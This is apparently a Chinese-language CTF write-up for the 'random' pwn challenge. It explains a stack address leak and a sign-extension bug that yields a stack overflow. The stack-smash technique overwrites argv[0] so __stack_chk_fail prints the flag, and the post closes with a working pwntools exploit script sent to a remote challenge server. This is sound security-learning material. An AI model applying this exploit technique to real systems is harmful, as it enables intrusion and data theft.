---
title: PWN-random（stack smash）
description: PWN-random（stack smash）-writeup
date: 2021-08-11 15:07:56
categories:
 - PWN
tags:
---

# PWN-random（stack smash）

## IDA分析



main函数

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646403105-ca498f11-5e14-4763-86a7-1a1eeedaa65b.png)

发现prctl，用seccomp-tools dump ./random，发现禁止了execve

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646407902-d657d615-29f7-48c7-a583-c745013d841f.png)

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646413681-87c171a6-d134-40ae-8be1-59c8b80c7a27.png)

将flag的内容写到buf中，然后打印出buf的低一字节数据

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646434515-c141b10f-bf2e-4dcd-9f5f-07e8f7ba4d77.png)

返回一个整形数据给v0，然后与0x80作与赋值给dword_20204c，然后作为sub_C1F的第二个参数

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646442349-8b34368b-c44f-4542-8dd1-b7be90259058.png)

一个一个字节赋值给buf，遇到'\n'退出

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646450597-916f1461-17c0-415a-a9f4-3c572527fb48.png)

## 调试过程

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646459071-1ebc3d27-a193-4aba-82b5-bce48abdd793.png)

发现这里输入16个字节数据后，printf会打印出奇奇怪怪的东西，盲猜是栈的地址，通过调试发现确实是

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646464976-9d3bf181-d828-4ecc-895c-02ee79cba82b.png)

先找到buf的地址，我们就可以通过栈地址找出距离buf的偏移了，0x7ffe15c95da0-0x7ffe15c95a8=0x320

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646474955-42aa73cb-d8d6-4c55-ac98-10e6315fc325.png)

然后是这里，一直觉得这里有问题，卡了好久，然后看了一眼汇编，发现原来是跟0xFFFFFF80作与操作，而且movsx这个指令会直接也有问题，这里会将`32`位寄存器进行符号扩展到`64`位寄存器

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646488361-0756e9ab-f06b-48e5-b2fe-56a677eb28cd.png)

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646493315-a11a933c-be6c-4632-9cf2-c7e6d1adb2bd.png)

通过输入0x80调试发现RSI为0xffffffffffffff80，这个作为sub_C1F的第二个参数，也就是长度，那么就可以造成栈溢出了

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646498505-afb3134b-7fff-42a4-8097-bb7e70364cc3.png)

## 思路



现在是可以求出buf的地址，也就是flag的地址，也有栈溢出的漏洞，但是这题开了pie，不知道基地址和libc的地址，但是这题开了canary，这里就可以用到stack smash，通常return的时候发现栈被修改过就会触发__stack_chk_fail函数，这个函数会打印出argv[0]也就是文件名，argv是存在栈的高地址，可以通过修改argv[0]指向buf也就是flag，从而打印出flag



## EXP



```python
from pwn import *

context.log_level = 'debug'

# p = process('./random')
p = remote('106.75.105.53','52312')

payload = 'a'*15 + 'b'
p.sendafter('tell me your name',payload)
p.recvuntil('ab')
stack = u64(p.recv(6).ljust(8,'\x00'))
print(hex(stack))

flag_addr = stack - 0x320
print(hex(flag_addr))
p.recvline()
buf = p.recvline()[5:-1]
print(buf)
p.sendafter("leave something?\n", str(0x80))

payload = p64(flag_addr)*0x300
p.sendline(payload)

p.interactive()
```



![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1628646511312-a26c8405-b762-4d64-8861-0399a6902faf.png)